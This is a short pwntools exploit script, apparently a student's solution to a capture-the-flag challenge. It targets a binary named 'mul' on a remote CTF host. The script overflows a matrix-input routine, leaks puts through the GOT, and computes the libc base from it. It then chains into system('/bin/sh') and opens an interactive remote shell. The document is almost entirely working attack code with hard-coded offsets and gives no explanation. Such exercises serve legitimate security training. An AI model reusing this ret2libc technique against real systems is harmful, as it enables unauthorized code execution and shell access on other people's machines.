
# b01901169 Kai

from pwn import *

mul = ELF('./mul')
main = mul.symbols['main']
puts = mul.symbols['puts']
puts_got = 0x804a010 

libc = ELF('./libc.so.6')
gets_off = libc.symbols['gets'] # elf.symbols['gets']
system_off = libc.symbols['system']
puts_off = libc.symbols['puts']
ret = '0x804839e'

#r = remote('127.0.0.1', 8888)
r = remote('csie.ctf.tw', 10115)

raw_input('pause')
r.send('-1\n')
r.send('-1\n')

#----------------------row----------------------
#r.send('1 1 1 0' + '\n')
for i in range(205):
  r.send(str(i+1) + ' \n') # row v2 = 250


r.send( str(puts) + ' ' + str(main) + ' ' + str(puts_got) + ' ' + '0\n') # column v1 = 205+something
#-------------------column-----------------------
r.send('1 0\n') # column v1 = 1

#---------------- recv --------------------------

tmp2 = r.recvline()
for i in range(207):
  tmp2 = r.recvline()
print "recv string : %s\n" % tmp2 # junk

tmp = r.recvline()
print "true recv string : %x\n" % u32(tmp[:4])

#--------------- base --------------------------
base = u32(tmp[:4]) - puts_off
print 'base = ',hex(base)

gets = base + gets_off
system = base + system_off
sh_off = 0x15e324
sh_entry = base + sh_off
print 'gets = ', hex(gets)
print 'system = ', hex(system)

#-------------- second main -------------------
r.send('-1\n')
r.send('-1\n')
#r.send('1 0\n')
#raw_input('pause')
for i in range(203):
  r.send((str(i+1)+' \n'))
r.send(
      #str(gets) + ' ' +
      str(system) + ' ' +
      str(puts_got) + ' ' +
      str(sh_entry) + ' ' +
      '0\n'
      )
r.send('1 0\n')
r.interactive()
#----------------------------------------------

#base = u32(r.recvrepeat()[:4]) - puts_off

